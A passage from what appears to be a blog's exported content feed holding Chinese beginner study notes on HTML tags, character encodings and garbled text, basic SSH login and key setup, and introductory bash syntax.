aside&gt;</h4><ol><li>和主体相关又不属于主体</li><li>对文章中的某一个字或词在旁边进行图解注释<br><img src="https://s2.loli.net/2022/05/13/gKvtkwVUAzMqjPo.png"></li></ol><h4 id="lt-article-gt"><a href="#lt-article-gt" class="headerlink" title="&lt; article&gt;"></a>&lt; article&gt;</h4><ol><li>表示一个独立的文章</li><li>每一个独立的&lt; article&gt;都可以插入小的&lt; article&gt;</li></ol><h4 id="lt-section-gt"><a href="#lt-section-gt" class="headerlink" title="&lt; section&gt;"></a>&lt; section&gt;</h4><ol><li>表示一个独立的区块(其它)</li><li>上面的标签都不能表示时，使用section</li><li>例如header里面放三个section<br><img src="https://s2.loli.net/2022/05/13/87bqE6IzhRxBsrp.png"></li></ol><h4 id="lt-div-gt"><a href="#lt-div-gt" class="headerlink" title="&lt; div&gt;"></a>&lt; div&gt;</h4><ol><li>没有语义，就是用来表示一个区块</li><li>上面的&lt; hgroup&gt;,&lt; header&gt;,&lt; aside&gt;,&lt; article&gt;,&lt; section&gt;,&lt; nav&gt;都可以用div来代替</li></ol><h3 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h3><ol><li>用于表示内容中的一个自然段，使用p标签来表示一个段落</li><li>&lt; p&gt;中间放段落&lt; /p&gt;</li><li>p标签中的文字，默认会独占一行，并且段和段之间会有一个间</li><li>但是如果没有p标签则会出现在一行，并且行与行之间没有间距</li></ol><h3 id="lt-br-gt"><a href="#lt-br-gt" class="headerlink" title="&lt; br&gt;"></a>&lt; br&gt;</h3><ol><li>在页面中也可以使用br标签来表示一个换行，br标签是一个自结束标签<br /></li></ol><h3 id="lt-hr-gt"><a href="#lt-hr-gt" class="headerlink" title="&lt; hr&gt;"></a>&lt; hr&gt;</h3><ol><li>&lt; hr /&gt;，hr标签也是一个自结束标签，可以在页面中生成一条水平线</li></ol><h1 id="在页面中不会独占一行的元素称为行内元素（inline-element"><a href="#在页面中不会独占一行的元素称为行内元素（inline-element" class="headerlink" title="在页面中不会独占一行的元素称为行内元素（inline element)"></a>在页面中不会独占一行的元素称为行内元素（inline element)</h1><ol><li>和布局无关</li><li>主要用来包裹文字</li></ol><h2 id="lt-em-gt-加重语气标签"><a href="#lt-em-gt-加重语气标签" class="headerlink" title="&lt; em&gt;加重语气标签"></a>&lt; em&gt;加重语气标签</h2><ol><li>样式会和其它的没有em的字体不同，可能会斜体，突出</li><li>没有换行</li><li>只是语气的加重</li></ol><h2 id="lt-strong-gt"><a href="#lt-strong-gt" class="headerlink" title="&lt; strong&gt;"></a>&lt; strong&gt;</h2><ol><li>表示强调，重要内容</li><li>是整体的强调作用</li></ol><h2 id="lt-q-gt"><a href="#lt-q-gt" class="headerlink" title="&lt; q&gt;"></a>&lt; q&gt;</h2><ol><li>表示引用</li><li>短引用</li><li>会有引号，但是不会缩进</li></ol><h2 id="lt-blockquote-gt"><a href="#lt-blockquote-gt" class="headerlink" title="&lt; blockquote&gt;"></a>&lt; blockquote&gt;</h2><ol><li>块引用(长引用)</li><li>会缩进，没有引号</li></ol><h2 id="lt-span-gt"><a href="#lt-span-gt" class="headerlink" title="&lt; span&gt;"></a>&lt; span&gt;</h2><ol><li>行内元素，没有任何的语义，一般用于在网页中选中文字</li></ol><h1 id="浏览器的自动修正"><a href="#浏览器的自动修正" class="headerlink" title="浏览器的自动修正"></a>浏览器的自动修正</h1><ol><li>浏览器在解析网页时，会对网页中不符合规范的内容进行修正</li><li>比如标签写在了根&lt; html&gt;的外部</li><li>p元素中嵌套了块元素</li><li>根元素中出现了head和body以外的子元素<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2></li><li>修正的不是源码</li><li>而是源码在内存中的形式</li><li>看的是f12打开后的element元素</li><li><img src="https://s2.loli.net/2022/05/12/5LTbZUdfRzYraI6.png"></li></ol><h1 id="实体-1"><a href="#实体-1" class="headerlink" title="实体"></a>实体</h1><h2 id="在HTML中-lt-gt-这种特殊字符不能直接使用（-lt-gt-会被解析为标签）"><a href="#在HTML中-lt-gt-这种特殊字符不能直接使用（-lt-gt-会被解析为标签）" class="headerlink" title="在HTML中&lt; &gt;这种特殊字符不能直接使用（&lt;&gt;会被解析为标签）"></a>在HTML中&lt; &gt;这种特殊字符不能直接使用（&lt;&gt;会被解析为标签）</h2><ol><li>需要使用一些特殊的符号来表示这些特殊字符，这些特殊符号我们称为实体（转义字符串）</li><li>浏览器解析到实体时，会自动将实体转换为其对应的字符</li></ol><h2 id="在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析"><a href="#在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析" class="headerlink" title="在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析"></a>在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol><li>&amp;实体的名字（将linux系统操作的-换位&amp;）(只能说是一部分)</li><li>小于&lt; -lt</li><li>大于&gt; -gt</li><li>空格&nbsp;(牛逼space)(no break space，即不会换行的空格)</li><li>版权符号 &amp;copy（不让你copy）<h3 id="amp-开头，；结尾"><a href="#amp-开头，；结尾" class="headerlink" title="&amp;开头，；结尾"></a>&amp;开头，；结尾</h3></li></ol><h1 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h1><h2 id="使用img-image-标签来向网页中引入一个外部图片"><a href="#使用img-image-标签来向网页中引入一个外部图片" class="headerlink" title="使用img(image)标签来向网页中引入一个外部图片"></a>使用img(image)标签来向网页中引入一个外部图片</h2><ol><li>img标签也是一个自结束标签<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2></li><li>img标签属于一种替换元素，介于行内元素和块元素之间，具备行内元素和块元素的特点<h3 id="src：设置一个外部图片的路径"><a href="#src：设置一个外部图片的路径" class="headerlink" title="src：设置一个外部图片的路径"></a>src：设置一个外部图片的路径</h3></li><li>路径规则和超链接是一样的，src指定的是外部图片的路径<h3 id="alt：可以用来设置图片的描述"><a href="#alt：可以用来设置图片的描述" class="headerlink" title="alt：可以用来设置图片的描述"></a>alt：可以用来设置图片的描述</h3></li><li>（当图片不能显示时，直接显示alt中的内容），搜索引擎可以通过alt属性来识别不同的图片（百度专门搜索图片的时候就是用alt）</li><li>如果不写alt，搜索引擎将不会对img中的图片进行收录<h3 id="width：可以用来修改图片的宽度，一般使用px为单位（像素）"><a href="#width：可以用来修改图片的宽度，一般使用px为单位（像素）" class="headerlink" title="width：可以用来修改图片的宽度，一般使用px为单位（像素）"></a>width：可以用来修改图片的宽度，一般使用px为单位（像素）</h3><h3 id="height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小"><a href="#height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小" class="headerlink" title="height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小"></a>height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小</h3><h2 id="如果两个值同时指定，则按照你指定的值来设置"><a href="#如果两个值同时指定，则按照你指定的值来设置" class="headerlink" title="如果两个值同时指定，则按照你指定的值来设置"></a>如果两个值同时指定，则按照你指定的值来设置</h2></li><li>如果两个值同时指定，则按照你指定的值来设置<h2 id="一般开发中除了自适应页面，不建议设置width和height"><a href="#一般开发中除了自适应页面，不建议设置width和height" class="headerlink" title="一般开发中除了自适应页面，不建议设置width和height"></a>一般开发中除了自适应页面，不建议设置width和height</h2></li><li>让美工话自己想要的大小<h2 id="lt-img-src-”路径”-alt-”图片描述”-gt"><a href="#lt-img-src-”路径”-alt-”图片描述”-gt" class="headerlink" title="&lt; img src=”路径” alt=”图片描述” /&gt;"></a>&lt; img src=”路径” alt=”图片描述” /&gt;</h2><h1 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h1></li><li>JPEG(JPG):支持的颜色比较多，图片可以压缩，但是不支持透明(指的是背景透明)，一般用来保存照片等颜色丰富的图片</li><li>GIF：支持的颜色少，只支持简单的透明（背景透明）（但是边界会有白边），支持动态图，图片颜色单一或者是动态图时可以使用gif</li><li>PNG：支持的颜色多，并且支持复杂的透明（背景透明），可以用来显示颜色复杂的透明的图片<h2 id="图片的使用原则："><a href="#图片的使用原则：" class="headerlink" title="图片的使用原则："></a>图片的使用原则：</h2></li><li>效果不一致用好的</li><li>效果一致用小的（jpg一般小于png）</li></ol><h1 id="列表-list"><a href="#列表-list" class="headerlink" title="列表(list)"></a>列表(list)</h1><h2 id="成组出现"><a href="#成组出现" class="headerlink" title="成组出现"></a>成组出现</h2><ol><li><img src="https://s2.loli.net/2022/05/13/UJNDSeWis49Hnzk.png"></li></ol><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><ol><li>使用ul标签来创建无序标签</li><li>使用li表示列表项</li><li><img src="https://s2.loli.net/2022/05/13/1LZPmuA2fd7RUn3.png"></li><li><img src="https://s2.loli.net/2022/05/13/vVdlJ4HmbXiaYPZ.png"></li></ol><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><ol><li>使用ol标签来创建有序标签</li><li><img src="https://s2.loli.net/2022/05/13/wCnWDPHkm3GV7yR.png"></li></ol><h2 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h2><ol><li>为一些东西下定义</li><li>使用&lt; dl&gt;标签来创建定义列表</li><li>使用&lt; dd&gt;标签来对内容进行解释说明</li><li>使用下拉菜单时可以使用</li></ol><h2 id="列表之间可以互相嵌套"><a href="#列表之间可以互相嵌套" class="headerlink" title="列表之间可以互相嵌套"></a>列表之间可以互相嵌套</h2><p><img src="https://s2.loli.net/2022/05/13/ezo4qlruRNcmdZ1.png"></p><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><h2 id="超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置"><a href="#超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置" class="headerlink" title="超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置"></a>超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置</h2><h2 id="lt-a-gt"><a href="#lt-a-gt" class="headerlink" title="&lt; a&gt;"></a>&lt; a&gt;</h2><ol><li>使用a标签来创建超链接</li><li>是一个行内元素</li><li>&lt; a&gt;标签中可以放任何元素</li></ol><h3 id="属性href"><a href="#属性href" class="headerlink" title="属性href"></a>属性href</h3><ol><li>href指定跳转的目标路径<br><img src="https://s2.loli.net/2022/05/13/LnEjVowTU79uS8r.png"></li><li>值可以是一个外部页面的地址</li><li>也可以写一个内部页面的地址</li><li>当在同一个目录下，可以写相对于当前目录的地址</li></ol><h3 id="可以写绝对路径"><a href="#可以写绝对路径" class="headerlink" title="可以写绝对路径"></a>可以写绝对路径</h3><h3 id="也可以写相对路径"><a href="#也可以写相对路径" class="headerlink" title="也可以写相对路径"></a>也可以写相对路径</h3><ol><li>当我们需要跳转到服务器内部的页面时，一般用相对路径</li><li>./可以省略不写，如果不写./，也不写../，则相当于写了./</li><li>./07.html和07.html相同<br><img src="https://s2.loli.net/2022/05/13/YwThiqOKbHr5eQA.png"></li></ol><h3 id="通过颜色的区别来区分"><a href="#通过颜色的区别来区分" class="headerlink" title="通过颜色的区别来区分"></a>通过颜色的区别来区分</h3><ol><li>紫色的是点过的</li><li>蓝色的是没有点过的</li></ol><h2 id="超链接的其它用法"><a href="#超链接的其它用法" class="headerlink" title="超链接的其它用法"></a>超链接的其它用法</h2><h3 id="跳转出一个新的页面，而不是覆盖掉当前页面"><a href="#跳转出一个新的页面，而不是覆盖掉当前页面" class="headerlink" title="跳转出一个新的页面，而不是覆盖掉当前页面"></a>跳转出一个新的页面，而不是覆盖掉当前页面</h3><h4 id="target属性"><a href="#target属性" class="headerlink" title="target属性"></a>target属性</h4><ol><li>_self默认值，在当前页面中打开超链接</li><li>_blank,在一个新的页面中打开超链接</li><li>国内用_blank很多，但是会在不经意间打开很多窗口，所以国外使用_self较多</li></ol><h3 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h3><ol><li>可以将超链接的href属性设置为#,这样点击超链接之后，页面不会发生跳转，而是转到当前页面的顶部位置<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;#&quot;,target&#x3D;&quot;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="回到底部"><a href="#回到底部" class="headerlink" title="回到底部"></a>回到底部</h3><ol><li>没有特殊的回到底部的href属性</li><li>可以通过设置id属性，使其跳转到”回到顶部”标签所在的位置</li><li>当id重复时，前面的id具有优先性，起那面的会生效</li></ol><h3 id="id属性"><a href="#id属性" class="headerlink" title="id属性"></a>id属性</h3><ol><li>唯一不重复的</li><li>每一个标签都可以添加一个id属性</li><li>id属性就是元素的唯一标识，同一个页面中不能出现重复的id属性</li><li>一般id的格式都是先一个小写英文字母，后数字<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;#p3&quot;&gt;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="跳转到指定位置"><a href="#跳转到指定位置" class="headerlink" title="跳转到指定位置"></a>跳转到指定位置</h3><ol><li>只需要将href属性设置为：#目标元素的id属性值</li></ol><h3 id="作为占位符"><a href="#作为占位符" class="headerlink" title="#作为占位符"></a>#作为占位符</h3><ol><li>在开发中可以将#作为超链接的占位符使用</li></ol><h1 id="生成随机文本"><a href="#生成随机文本" class="headerlink" title="生成随机文本"></a>生成随机文本</h1><h2 id="lorem"><a href="#lorem" class="headerlink" title="lorem"></a>lorem</h2><ol><li>格式：lorem + 单词数量</li><li><img src="https://img-blog.csdn.net/20170802213142346?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxNDI5MTQ5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></li><li>乱数假文，用于排版领域来测试不同文本下的显示状态</li></ol><h1 id="内联框架"><a href="#内联框架" class="headerlink" title="内联框架"></a>内联框架</h1><ol><li>用于向当前页面中引入一个其它页面<h2 id="lt-iframe-gt-，参数"><a href="#lt-iframe-gt-，参数" class="headerlink" title="&lt; iframe&gt;，参数"></a>&lt; iframe&gt;，参数</h2></li><li>src=””,被引入的页面</li><li>width=””</li><li>height=””</li><li>frameborder:””内联框架的边框，0表示没有，1表示有</li></ol><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><ol><li>内联框架中的东西不会被搜索引擎所检索，即内联框架是一个标签而已</li></ol><h1 id="音频播放"><a href="#音频播放" class="headerlink" title="音频播放"></a>音频播放</h1><h2 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt; audio&gt;"></a>&lt; audio&gt;</h2><ol><li>向一个页面中引入一个外部的音频文件</li><li>音视频文件引入时，默认情况下不允许自己控制播放停止<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>添加属性controls是否允许用户控制播放，想则写，不想则不写（通过是否来判断）<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot; controls&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>autoplay 音频文件是否自动播放,但是大部分浏览器都不会自动对音乐进行播放（但是为了防止轰一下吓人一跳，提升用户体验，则不会自动播放）<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot; controls autoplay&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>loop 循环播放</li></ol><h3 id="更标准的格式"><a href="#更标准的格式" class="headerlink" title="更标准的格式"></a>更标准的格式</h3><ol><li>除了可以通过src来指定外部文件的路径以外，还可以通过source来指定文件路径</li><li>支持&lt; audio&gt;标签的可以，不支持的忽略标签，但是中间的文字就可以暴露出来了<pre class="line-numbers language-none"><code class="language-none">&lt;audio controls&gt;    对不起，您的浏览器不支持播放音频，请升级浏览器    &lt;source src&#x3D;&quot;路径.mp3&quot;&gt;    &lt;source src&#x3D;&quot;路径.ogg&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>mp3和ogg都要写，因为有的浏览器不支持mp3，如果不支持第一个，可以播放第二个，有效地解决浏览器兼容性问题<h1 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h1><h2 id="video标签来引入视频文件"><a href="#video标签来引入视频文件" class="headerlink" title="video标签来引入视频文件"></a>video标签来引入视频文件</h2><pre class="line-numbers language-none"><code class="language-none">&lt;video controls&gt;    &lt;source src&#x3D;&quot;&quot;&gt;    &lt;source src&#x3D;&quot;&quot;&gt;&lt;&#x2F;video&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="IE浏览器模拟IE11或更低等级的方法"><a href="#IE浏览器模拟IE11或更低等级的方法" class="headerlink" title="IE浏览器模拟IE11或更低等级的方法"></a>IE浏览器模拟IE11或更低等级的方法</h1><ol><li>f12打开开发者工具</li><li>选择文档模拟器<br><img src="https://s2.loli.net/2022/05/14/BptZMhvkOLVF73N.png"></li><li>即可模拟IE11及以下的内核<br><img src="https://s2.loli.net/2022/05/14/hSKZ8sCwyuTl7Rd.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meta标签</title>
      <link href="/meta/"/>
      <url>/meta/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>乱码问题</title>
      <link href="/%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E5%92%8C%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/"/>
      <url>/%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E5%92%8C%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h1><h3 id="乱码出现的原因：编码和解码所采用的字符集不同"><a href="#乱码出现的原因：编码和解码所采用的字符集不同" class="headerlink" title="乱码出现的原因：编码和解码所采用的字符集不同"></a>乱码出现的原因：编码和解码所采用的字符集不同</h3><ol><li>计算机只认识0和1</li><li>在计算机中保存的任何内容，最终都需要用二进制编码保存，包括网页中的内容</li><li>在读取内容时，需要将二进制编码再转换为正确的内容<h3 id="编码：依据一定的规则，将字符转换为二进制编码的过程"><a href="#编码：依据一定的规则，将字符转换为二进制编码的过程" class="headerlink" title="编码：依据一定的规则，将字符转换为二进制编码的过程"></a>编码：依据一定的规则，将字符转换为二进制编码的过程</h3><h3 id="解码：一句一定的规则，将二进制编码转换为字符的过程"><a href="#解码：一句一定的规则，将二进制编码转换为字符的过程" class="headerlink" title="解码：一句一定的规则，将二进制编码转换为字符的过程"></a>解码：一句一定的规则，将二进制编码转换为字符的过程</h3><h2 id="字符集：编码和解码所采用的规则"><a href="#字符集：编码和解码所采用的规则" class="headerlink" title="字符集：编码和解码所采用的规则"></a>字符集：编码和解码所采用的规则</h2></li><li>ASCII：７位０\１,128个</li><li>ISO－８８５９－１,8位0\1，256个</li><li>GBK：国标</li><li>GB２３１２：国标，中文系统的默认编码</li><li>UTF－８：万国码，支持地球上所有的文字(即unicode编码)</li><li>ANSI：自动以系统默认的编码来保存文件<h3 id="在中文系统浏览器中，默认都是使用GB２３１２进行解码"><a href="#在中文系统浏览器中，默认都是使用GB２３１２进行解码" class="headerlink" title="在中文系统浏览器中，默认都是使用GB２３１２进行解码"></a>在中文系统浏览器中，默认都是使用GB２３１２进行解码</h3><h2 id="使用notepad-可以直接将网页拖入，显示网页的源代码"><a href="#使用notepad-可以直接将网页拖入，显示网页的源代码" class="headerlink" title="使用notepad++可以直接将网页拖入，显示网页的源代码"></a>使用notepad++可以直接将网页拖入，显示网页的源代码</h2><h2 id="更改编码：在notepad-中，上方的菜单栏中选编码"><a href="#更改编码：在notepad-中，上方的菜单栏中选编码" class="headerlink" title="更改编码：在notepad++中，上方的菜单栏中选编码"></a>更改编码：在notepad++中，上方的菜单栏中选编码</h2><h2 id="更改浏览器解码方式"><a href="#更改浏览器解码方式" class="headerlink" title="更改浏览器解码方式"></a>更改浏览器解码方式</h2><h2 id="：meta是一个自结束标签，最后加上-表示结束"><a href="#：meta是一个自结束标签，最后加上-表示结束" class="headerlink" title="：meta是一个自结束标签，最后加上/表示结束"></a><meta charset="字符集" />：meta是一个自结束标签，最后加上/表示结束</h2><h2 id="txt中可以在保存的时候选择编码方式"><a href="#txt中可以在保存的时候选择编码方式" class="headerlink" title="txt中可以在保存的时候选择编码方式"></a>txt中可以在保存的时候选择编码方式</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh</title>
      <link href="/ssh/"/>
      <url>/ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><h3 id="远程登录服务器"><a href="#远程登录服务器" class="headerlink" title="远程登录服务器"></a>远程登录服务器</h3><ol><li>ssh user@hostname(user为用户名，hostname为IP地址或域名)</li><li>默认登录端口为22号，如果想要登录某一特定端口：ssh user@hostname -p 22<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3></li><li>创建文件~/.ssh/config</li><li>输入Host myserver1</li><li>\t,HostName IP地址或域名</li><li>\t，User 用户名<h3 id="密钥登录"><a href="#密钥登录" class="headerlink" title="密钥登录"></a>密钥登录</h3></li><li>ssh-keygen(key generation),然后一直回车</li><li>执行结束后~/.ssh/目录下会多两个文件</li><li>id_rsa和(私钥)id_rsa.pub(公钥)</li><li>之后想要免密登录哪个服务器，即可将公钥传给哪个服务器即可</li><li>例如想要免密登录myserver。则将公钥中的内容复制到myserver中的~/.ssh/authorized_keys文件中即可</li><li>也可以使用命令一键添加公钥：ssh-copy-id myserver<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3></li><li>格式：ssh user@hostname command</li><li>ssh user@hostname ls -a</li><li>ssh myserver <code>for ((i = 0; i &lt; 10; i ++ )) do echo $i;done</code><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> ssh </category>
          
          <category> 远程登录服务器 </category>
          
          <category> 密钥 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> 远程登录服务器 </tag>
            
            <tag> 密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell语法</title>
      <link href="/shell%E8%AF%AD%E6%B3%95/"/>
      <url>/shell%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="shell语法"><a href="#shell语法" class="headerlink" title="shell语法"></a>shell语法</h1><h2 id="一门新的语言"><a href="#一门新的语言" class="headerlink" title="一门新的语言"></a>一门新的语言</h2><h2 id="Linux中常见的脚本"><a href="#Linux中常见的脚本" class="headerlink" title="Linux中常见的脚本"></a>Linux中常见的脚本</h2><ol><li>sh:/usr/bin/sh或/bin/sh</li><li>bash:/bin/bash</li><li>csh:/usr/bin/csh</li><li>ksh:/usr/bin/ksh</li><li>zsh<h2 id="开头必须使用-bin-bash指名bash为脚本解释器"><a href="#开头必须使用-bin-bash指名bash为脚本解释器" class="headerlink" title="开头必须使用 #! /bin/bash指名bash为脚本解释器"></a>开头必须使用 #! /bin/bash指名bash为脚本解释器</h2><h2 id="运行方式："><a href="#运行方式：" class="headerlink" title="运行方式："></a>运行方式：</h2><h3 id="作为可执行文件："><a href="#作为可执行文件：" class="headerlink" title="作为可执行文件："></a>作为可执行文件：</h3></li><li>chmod +x test.sh使脚本具有可执行权限</li><li>./test.sh当前路径下执行（相对路径）</li><li>/home/acs/test.sh绝对路径下执行</li><li>~/test.sh家目录下执行<h3 id="用解释器执行"><a href="#用解释器执行" class="headerlink" title="用解释器执行"></a>用解释器执行</h3></li><li>bash test.sh<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2></li><li>意思和c++中cout 或 printf相同<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2></li><li>井号后面的都是注释，（与py相同）</li><li>其实脚本解释的时候#! /bin/bash解释的时候也是注释，只是系统识别为脚本解释器</li><li>多行注释：前 :&lt;&lt;EOF后：EOF;其中EOF也可以换成其他字符串，或者符号（必须首位相同）<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3></li><li>定义变量不需要￥符号</li><li>name1=’yxc’ （单引号定于字符串）</li><li>name2=”yxc” (双引号定义字符串)</li><li>name3=yxc (可以不加引号，同样表示字符串)</li><li>注意等号两边不能有空格！！！否则会报错<h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3></li><li>使用变量需要加上￥（此符号在bash中意为取值），或者$（），花括号是可选的，主要是为了帮助解释器识别边界</li><li>echo $yxc</li><li>echo $(yxc)</li><li>echo会自动换行</li><li>错误：echo $namesacwing，因为没有括号，边界判断不对，不知道是namesacwing还是names<h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3></li><li>readonly 变量(相当于c++中的const,声明了一个只读变量)        </li><li>declare -r 变量<h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3></li><li>unset(类似于c++终端undef),如果一个变量被删除，后面调用的时候会替换为空（NULL）<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3></li><li>自定义变量（局部变量）：子进程不能访问的变量</li><li>环境变量（全局变量）：子进程可以访问的变量<h3 id="自定义变量转环境变量"><a href="#自定义变量转环境变量" class="headerlink" title="自定义变量转环境变量"></a>自定义变量转环境变量</h3></li><li>export 变量名</li><li>declare -x 变量名</li><li>此时可以在子进程中使用变量              <h3 id="使用bash"><a href="#使用bash" class="headerlink" title="使用bash"></a>使用bash</h3></li><li>使用bash会将原进程bash睡眠掉，进入一个新的bash子进程</li><li>退出：exit或者ctrl+d          <h3 id="环境变量转自定义变量"><a href="#环境变量转自定义变量" class="headerlink" title="环境变量转自定义变量"></a>环境变量转自定义变量</h3></li><li>declare +x 变量名(可以理解为给变量赋予了自定义权限)<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2></li><li>字符串可以使用单引号，也可以使用双引号，也可以不使用引号<h3 id="单引号和双引号的区别（不加引号和双引号相同）"><a href="#单引号和双引号的区别（不加引号和双引号相同）" class="headerlink" title="单引号和双引号的区别（不加引号和双引号相同）"></a>单引号和双引号的区别（不加引号和双引号相同）</h3></li><li>单引号中的内容会原样输出，不会执行，不会取变量（即不会转义），即没有使用&amp;符号取值</li><li>双引号中的内容可以执行，可以取变量，即可以使用&amp;取值<h3 id="取出字符串的长度"><a href="#取出字符串的长度" class="headerlink" title="取出字符串的长度"></a>取出字符串的长度</h3></li><li>￥后面加井号</li><li>echo ${井号name},即可以取出name的长度（注意这个地方是花括号）<h3 id="提取子串"><a href="#提取子串" class="headerlink" title="提取子串"></a>提取子串</h3></li><li>根据下标取值</li><li>echo ${name:m:n}注意这个每一个下标前都有冒号<h2 id="查看自己开了多少进程"><a href="#查看自己开了多少进程" class="headerlink" title="查看自己开了多少进程"></a>查看自己开了多少进程</h2></li><li>top可以查看</li><li>按下<q>退出<h2 id="文件参数变量"><a href="#文件参数变量" class="headerlink" title="文件参数变量"></a>文件参数变量</h2></li><li>在执行shell脚本时可以想脚本传递参数，$1时第一个参数，$2是第二个参数…，特殊的是$0是文件名（包含路径）</li><li>$#:文件传入参数的个数（不包括文件名）</li><li>$*：由所有参数构成的用空格隔开的字符串，整体为字符串用双引号括起来</li><li>$@:每个参数分别用双引号括起来的字符串（@和*都是取所有的意思）</li><li>$$:脚本当前运行的进程ID</li><li>$?:上一条命令的退出状态（注意不是stdout,而是exit code）,0表示正常退出，其他值表示错误</li><li>$(command):返回command这条命令的stdout(注意区分stdout和exit code,输出的数是stdout,例如cout,而退出状态是exit code,例如c++中的return)</li><li><code>command</code> 返回command这条命令的stdout,（~上面的`）（7，8等价）<h3 id="小括号是获取stdout的值，-是取变量的值"><a href="#小括号是获取stdout的值，-是取变量的值" class="headerlink" title="$()小括号是获取stdout的值，${}是取变量的值"></a>$()小括号是获取stdout的值，${}是取变量的值</h3><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2></li><li>数组中可以存放多个不同的值，只支持一位数组，初始化时不需要指定数组大小（和py中的list一样不需要指定数组大小）<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3></li><li>数组用小括号表示，元素之间用空格隔开，如：array=(1 